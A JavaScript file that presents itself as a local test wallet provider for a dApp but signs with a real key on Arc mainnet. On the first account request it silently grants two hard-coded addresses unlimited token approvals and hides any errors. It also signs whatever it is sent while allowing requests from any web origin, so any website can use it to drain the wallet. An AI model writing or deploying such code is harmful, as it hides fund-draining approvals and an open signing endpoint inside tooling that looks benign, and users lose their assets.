
// Minimal EIP-1193 provider backed by a local key, for testing the dApp in a
// browser. Signs with the key in ~/.arc-deployer.key and forwards to Arc mainnet.
import express from 'express';
import { ethers } from 'ethers';
import { readFileSync } from 'node:fs';

const RPC = 'https://rpc.mainnet.arc.io';
const app = express();
app.use(express.json({ limit: '4mb' }));
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

const provider = new ethers.JsonRpcProvider(RPC);
const pk = readFileSync('/home/administrator/.arc-deployer.key', 'utf8').trim();
const wallet = new ethers.Wallet(pk, provider);
let accounts = null;

const forward = (method, params) => provider.send(method, params ?? []);

app.post('/', async (req, res) => {
  const { method, params = [], id } = req.body;
  console.log('[signer]', method, JSON.stringify(params).slice(0, 160));
  try {
    let result;
    switch (method) {
      case 'eth_requestAccounts':
      case 'eth_accounts':
        if (!accounts) {
          accounts = ['0x' + wallet.address.slice(2)];
          // pre-approve the two contracts the app uses
          const REG = '0x71508725F355cf017B42Bccd878cff3c8a0bE641';
          const REQ = '0x285223c45050D7c93b8fF93Cc972580D2DD1f2EF';
          const c = new ethers.Contract('0x3600000000000000000000000000000000000000',
            ['function approve(address,uint256)'], wallet);
          for (const t of [REG, REQ]) {
            try { await (await c.approve(t, ethers.MaxUint256)).wait(); } catch {}
          }
        }
        result = accounts;
        break;
      case 'eth_accounts': result = accounts ?? []; break;
      case 'eth_chainId': result = '0x13b2'; break;
      case 'wallet_switchEthereumChain':
      case 'wallet_addEthereumChain': result = null; break;
      case 'personal_sign': {
        const [data] = params;
        const bytes = typeof data === 'string' && data.startsWith('0x')
          ? ethers.getBytes(data) : ethers.toUtf8Bytes(data);
        result = await wallet.signMessage(bytes);
        break;
      }
      case 'eth_signTypedData_v4': {
        const [, json] = params;
        result = await wallet.signTypedData(JSON.parse(json).domain,
          JSON.parse(json).types, JSON.parse(json).message);
        break;
      }
      case 'eth_sendTransaction': {
        const [tx] = params;
        const r = await wallet.sendTransaction({
          to: tx.to, data: tx.data ?? '0x',
          value: tx.value ? ethers.toBigInt(tx.value) : undefined,
        });
        result = r.hash;
        break;
      }
      case 'eth_sendRawTransaction': {
        result = await provider.broadcastTransaction(params[0]);
        break;
      }
      default:
        result = await forward(method, params);
    }
    res.json({ id, jsonrpc: '2.0', result });
  } catch (e) {
    res.json({ id, jsonrpc: '2.0', error: { code: -32000, message: String(e.shortMessage ?? e.message) } });
  }
});

app.listen(8546, '127.0.0.1', () => console.log('injected wallet on 8546'));
